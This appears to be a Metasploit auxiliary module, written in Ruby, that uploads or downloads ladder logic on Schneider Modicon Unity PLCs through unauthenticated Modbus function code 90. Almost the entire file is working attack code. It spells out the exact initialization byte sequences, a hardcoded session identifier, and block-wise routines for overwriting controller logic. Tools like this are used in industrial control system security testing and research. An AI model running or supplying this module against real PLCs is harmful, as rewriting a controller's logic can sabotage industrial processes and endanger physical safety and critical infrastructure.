##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::Tcp
  include Rex::Socket::Tcp

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Schneider Modicon Ladder Logic Upload/Download',
      'Description'    => %q{
        The Schneider Modicon with Unity series of PLCs use Modbus function
        code 90 (0x5a) to send and receive ladder logic.  The protocol is
        unauthenticated, and allows a rogue host to retrieve the existing
        logic and to upload new logic.

        Two modes are supported: "SEND" and "RECV," which behave as one might
        expect -- use 'set mode ACTIONAME' to use either mode of operation.

        In either mode, FILENAME must be set to a valid path to an existing
        file (for SENDing) or a new file (for RECVing), and the directory must
        already exist.  The default, 'modicon_ladder.apx' is a blank
        ladder logic file which can be used for testing.

        This module is based on the original 'modiconstux.rb' Basecamp module from
        DigitalBond.
      },
      'Author'         =>
        [
          'K. Reid Wightman <wightman[at]digitalbond.com>', # original module
          'todb' # Metasploit fixups
        ],
      'License'        => MSF_LICENSE,
      'References'     =>
        [
          [ 'URL', 'http://www.digitalbond.com/tools/basecamp/metasploit-modules/' ]
        ],
      'DisclosureDate' => 'Apr 5 2012'
      ))

    register_options(
      [
        OptString.new('FILENAME',
          [
            true,
            "The file to send or receive",
            File.join(Msf::Config.data_directory, "exploits", "modicon_ladder.apx")
          ]),
        OptEnum.new("MODE", [true, 'File transfer operation', "SEND",
          [
            "SEND",
            "RECV"
          ]
        ]),
        Opt::RPORT(502)
      ])

  end

  def run
    unless valid_filename?
      print_error "FILENAME invalid: #{datastore['FILENAME'].inspect}"
      return nil
    end
    @modbuscounter = 0x0000 # used for modbus frames
    connect
    init
    case datastore['MODE']
    when "SEND"
      writefile
    when "RECV"
      readfile
    end
  end

  def valid_filename?
    if datastore['MODE'] == "SEND"
      File.readable? datastore['FILENAME']
    else
      File.writable?(File.split(datastore['FILENAME'])[0].to_s)
    end
  end

  # this is used for building a Modbus frame
  # just prepends the payload with a modbus header
  def makeframe(packetdata)
    if packetdata.size > 255
      print_error("#{rhost}:#{rport} - MODBUS - Packet too large: #{packetdata.inspect}")
      return
    end
    payload = ""
    payload += [@modbuscounter].pack("n")
    payload += "\x00\x00\x00" #dunno what these are
    payload += [packetdata.size].pack("c") # size byte
    payload += packetdata
  end

  # a wrapper just to be sure we increment the counter
  def sendframe(payload)
    sock.put(payload)
    @modbuscounter += 1
    # TODO: Fix with sock.timed_read -- Should make it faster, just need a test.
    r = sock.recv(65535, 0.1)
    return r
  end

  # This function sends some initialization requests
  # required for priming the Quantum
  def init
    payload = "\x00\x5a\x00\x02"
    sendframe(makeframe(payload))
    payload = "\x00\x5a\x00\x01\x00"
    sendframe(makeframe(payload))
    payload = "\x00\x5a\x00\x0a\x00" + 'T' * 0xf9
    sendframe(makeframe(payload))
    payload = "\x00\x5a\x00\x03\x00"
    sendframe(makeframe(payload))
    payload = "\x00\x5a\x00\x03\x04"
    sendframe(makeframe(payload))
    payload = "\x00\x5a\x00\x04"
    sendframe(makeframe(payload))
    payload = "\x00\x5a\x00\x01\x00"
    sendframe(makeframe(payload))
    payload = "\x00\x5a\x00\x0a\x00"
    (0..0xf9).each { |x| payload += [x].pack("c") }
    sendframe(makeframe(payload))
    payload = "\x00\x5a\x00\x04"
    sendframe(makeframe(payload))
    payload = "\x00\x5a\x00\x04"
    sendframe(makeframe(payload))
    payload = "\x00\x5a\x00\x20\x00\x13\x00\x00\x00\x00\x00\x64\x00"
    sendframe(makeframe(payload))
    payload = "\x00\x5a\x00\x20\x00\x13\x00\x64\x00\x00\x00\x9c\x00"
    sendframe(makeframe(payload))
    payload = "\x00\x5a\x00\x20\x00\x14\x00\x00\x00\x00\x00\x64\x00"
    sendframe(makeframe(payload))
    payload = "\x00\x5a\x00\x20\x00\x14\x00\x64\x00\x00\x00\xf6\x00"
    sendframe(makeframe(payload))
    payload = "\x00\x5a\x00\x20\x00\x14\x00\x5a\x01\x00\x00\xf6\x00"
    sendframe(makeframe(payload))
    payload = "\x00\x5a\x00\x20\x00\x14\x00\x5a\x02\x00\x00\xf6\x00"
    sendframe(makeframe(payload))
    payload = "\x00\x5a\x00\x20\x00\x14\x00\x46\x03\x00\x00\xf6\x00"
    sendframe(makeframe(payload))
    payload = "\x00\x5a\x00\x20\x00\x14\x00\x3c\x04\x00\x00\xf6\x00"
    sendframe(makeframe(payload))
    payload = "\x00\x5a\x00\x20\x00\x14\x00\x32\x05\x00\x00\xf6\x00"
    sendframe(makeframe(payload))
    payload = "\x00\x5a\x00\x20\x00\x14\x00\x28\x06\x00\x00\x0c\x00"
    sendframe(makeframe(payload))
    payload = "\x00\x5a\x00\x20\x00\x13\x00\x00\x00\x00\x00\x64\x00"
    sendframe(makeframe(payload))
    payload = "\x00\x5a\x00\x20\x00\x13\x00\x64\x00\x00\x00\x9c\x00"
    sendframe(makeframe(payload))
    payload = "\x00\x5a\x00\x10\x43\x4c\x00\x00\x0f"
    payload += "USER-714E74F21B" # Yep, really
    #payload += "META-SPLOITMETA"
    sendframe(makeframe(payload))
    payload = "\x00\x5a\x01\x04"
    sendframe(makeframe(payload))
    payload = "\x00\x5a\x01\x50\x15\x00\x01\x0b"
    sendframe(makeframe(payload))
    payload = "\x00\x5a\x01\x50\x15\x00\x01\x07"
    sendframe(makeframe(payload))
    payload = "\x00\x5a\x01\x12"
    sendframe(makeframe(payload))
    payload = "\x00\x5a\x01\x04"
    sendframe(makeframe(payload))
    payload = "\x00\x5a\x01\x12"
    sendframe(makeframe(payload))
    payload = "\x00\x5a\x01\x04"
    sendframe(makeframe(payload))
    payload = "\x00\x5a\x00\x02"
    sendframe(makeframe(payload))
    payload = "\x00\x5a\x00\x58\x01\x00\x00\x00\x00\xff\xff\x00\x70"
    sendframe(makeframe(payload))
    payload = "\x00\x5a\x00\x58\x07\x01\x80\x00\x00\x00\x00\xfb\x00"
    sendframe(makeframe(payload))
    payload = "\x00\x5a\x01\x04"
    sendframe(makeframe(payload))
    payload = "\x00\x5a\x00\x58\x07\x01\x80\x00\x00\x00\x00\xfb\x00"
    sendframe(makeframe(payload))
  end

  # Write the contents of local file filename to the target's filenumber
  # blank logic files will be available on the Digital Bond website
  def writefile
    print_status "#{rhost}:#{rport} - MODBUS - Sending write request"
    blocksize = 244	# bytes per block in file transfer
    buf = File.open(datastore['FILENAME'], 'rb') { |io| io.read }
    fullblocks = buf.length / blocksize
    if fullblocks > 255
      print_error("#{rhost}:#{rport} - MODBUS - File too large, aborting.")
      return
    end
    lastblocksize = buf.length - (blocksize*fullblocks)
    fileblocks = fullblocks
    if lastblocksize != 0
      fileblocks += 1
    end
    filetype = buf[0..2]
    if filetype == "APX"
      filenum = "\x01"
    elsif filetype == "APB"
      filenum = "\x10"
    end
    payload = "\x00\x5a\x00\x03\x01"
    sendframe(makeframe(payload))
    payload = "\x00\x5a\x00\x02"
    sendframe(makeframe(payload))
    payload = "\x00\x5a\x01\x04"
    sendframe(makeframe(payload))
    payload = "\x00\x5a\x00\x02"
    sendframe(makeframe(payload))
    payload = "\x00\x5a\x01\x04"
    sendframe(makeframe(payload))
    payload = "\x00\x5a\x00\x58\x02\x01\x00\x00\x00\x00\x00\xfb\x00"
    sendframe(makeframe(payload))
    payload = "\x00\x5a\x00\x02"
    sendframe(makeframe(payload))
    payload = "\x00\x5a\x01\x30\x00"
    payload += filenum
    response = sendframe(makeframe(payload))
    if response[8..9] == "\x01\xfe"
      print_status("#{rhost}:#{rport} - MODBUS - Write request success!  Writing file...")
    else
      print_error("#{rhost}:#{rport} - MODBUS - Write request error.  Aborting.")
      return
    end
    payload = "\x00\x5a\x01\x04"
    sendframe(makeframe(payload))
    block = 1
    block2status = 0 # block 2 must always be sent twice
    while block <= fullblocks
      payload = "\x00\x5a\x01\x31\x00"
      payload += filenum
      payload += [block].pack("c")
      payload += "\x00\xf4\x00"
      payload += buf[((block - 1) * 244)..((block * 244) - 1)]
      res = sendframe(makeframe(payload))
      vprint_status "#{rhost}:#{rport} - MODBUS - Block #{block}: #{payload.inspect}"
      if res[8..9] != "\x01\xfe"
        print_error("#{rhost}:#{rport} - MODBUS - Failure writing block #{block}")
        return
      end
      # redo this iteration of the loop if we're on block 2
      if block2status == 0 and block == 2
        print_status("#{rhost}:#{rport} - MODBUS - Sending block 2 a second time")
        block2status = 1
        redo
      end
      block += 1
    end
    if lastblocksize > 0
      payload = "\x00\x5a\x01\x31\x00"
      payload += filenum
      payload += [block].pack("c")
      payload += "\x00" + [lastblocksize].pack("c") + "\x00"
      payload += buf[((block-1) * 244)..(((block-1) * 244) + lastblocksize)]
      vprint_status "#{rhost}:#{rport} - MODBUS - Block #{block}: #{payload.inspect}"
      res = sendframe(makeframe(payload))
      if res[8..9] != "\x01\xfe"
        print_error("#{rhost}:#{rport} - MODBUS - Failure writing last block")
        return
      end
    end
    vprint_status "#{rhost}:#{rport} - MODBUS - Closing file"
    payload = "\x00\x5a\x01\x32\x00\x01" + [fileblocks].pack("c") + "\x00"
    sendframe(makeframe(payload))
  end

  # Only reading the STL file is supported at the moment :(
  def readfile
    print_status "#{rhost}:#{rport} - MODBUS - Sending read request"
    file = File.open(datastore['FILENAME'], 'wb')
    payload = "\x00\x5a\x01\x33\x00\x01\xfb\x00"
    response = sendframe(makeframe(payload))
    print_status("#{rhost}:#{rport} - MODBUS - Retrieving file")
    block = 1
    filedata = ""
    finished = false
    while !finished
      payload = "\x00\x5a\x01\x34\x00\x01"
      payload += [block].pack("c")
      payload += "\x00"
      response = sendframe(makeframe(payload))
      filedata += response[0xe..-1]
      vprint_status "#{rhost}:#{rport} - MODBUS - Block #{block}: #{response[0xe..-1].inspect}"
      if response[0xa] == "\x01" # apparently 0x00 == more data, 0x01 == eof?
        finished = true
      else
        block += 1
      end
    end
    print_status("#{rhost}:#{rport} - MODBUS - Closing file")
    payload = "\x00\x5a\x01\x35\x00\x01" + [block].pack("c") + "\x00"
    sendframe(makeframe(payload))
    file.print filedata
    file.close
  end

  def cleanup
    disconnect rescue nil
  end
end
